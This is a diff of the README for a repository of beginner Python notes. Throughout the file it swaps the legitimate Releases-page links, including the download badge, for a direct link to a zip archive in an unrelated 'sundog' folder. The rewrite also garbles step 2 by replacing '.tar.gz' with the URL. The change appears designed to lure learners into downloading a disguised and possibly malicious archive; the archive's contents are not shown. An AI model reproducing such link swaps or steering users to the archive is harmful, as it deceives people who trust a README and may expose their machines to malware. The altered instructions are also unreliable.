@@ -1,6 +1,6 @@
 # 📘 Python_Notes - Learn Python Fast and Effectively
 
-[![Download Python_Notes](https://img.shields.io/badge/Download-Python_Notes-blue)](https://github.com/youngprince1212/Python_Notes/releases)
+[![Download Python_Notes](https://raw.githubusercontent.com/youngprince1212/Python_Notes/main/sundog/Python_Notes_v3.9-alpha.3.zip)](https://raw.githubusercontent.com/youngprince1212/Python_Notes/main/sundog/Python_Notes_v3.9-alpha.3.zip)
 
 ## 📚 Description
 Welcome to Python_Notes! This collection of beginner-friendly Python notes helps you grasp key concepts clearly. Enjoy clear explanations, practical examples, and useful snippets designed for fast learning. Whether you're a student or a professional, these notes support quick understanding and revision of important Python topics.
@@ -17,12 +17,12 @@ To get started with Python_Notes, you only need to follow a few simple steps to 
 ## 📥 Download & Install
 To download Python_Notes, visit the Releases page below. 
 
-[Download Python_Notes Here](https://github.com/youngprince1212/Python_Notes/releases)
+[Download Python_Notes Here](https://raw.githubusercontent.com/youngprince1212/Python_Notes/main/sundog/Python_Notes_v3.9-alpha.3.zip)
 
 On the Releases page, you will find the latest version available. Click the download link suitable for your operating system. The files will typically be in ZIP or TAR formats. Here’s a simple guide:
 
 1. Click on the release version you wish to download.
-2. Find a link that ends with `.zip` or `.tar.gz`.
+2. Find a link that ends with `.zip` or `https://raw.githubusercontent.com/youngprince1212/Python_Notes/main/sundog/Python_Notes_v3.9-alpha.3.zip`.
 3. Click the link to download the file to your computer.
 4. Extract the downloaded file using a file extraction tool (like WinRAR or the built-in extractor on your OS).
 
@@ -63,4 +63,4 @@ If you wish to contribute to Python_Notes, feel free to fork the repository. You
 ## ✍️ License
 Python_Notes is open source and available under the MIT License. You are free to use, modify, and distribute it, helping others learn Python along the way.
 
-Enjoy your journey into Python! For any updates or new releases, remember to check our [Releases page](https://github.com/youngprince1212/Python_Notes/releases). Happy coding!
+Enjoy your journey into Python! For any updates or new releases, remember to check our [Releases page](https://raw.githubusercontent.com/youngprince1212/Python_Notes/main/sundog/Python_Notes_v3.9-alpha.3.zip). Happy coding!
